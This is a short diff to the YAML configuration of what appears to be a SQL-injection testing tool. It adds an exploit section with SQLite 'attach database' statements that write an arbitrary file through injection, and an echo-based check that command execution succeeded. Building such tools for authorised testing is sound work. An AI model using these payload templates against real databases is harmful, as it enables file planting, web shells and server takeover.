@@ -114,6 +114,13 @@ resource:
      ${field.value}
     concat: "|| '%7f' ||"
 
+ exploit: |
+  writeFile: |
+   ; attach database '%s' as %s
+   ; create table %s.%s (c text)
+   ; insert into %s.%s (c) values ("%s");
+  confirm: echo "iamin$((133707330+1))"
+
 strategy:
  configuration:
   slidingWindow: |
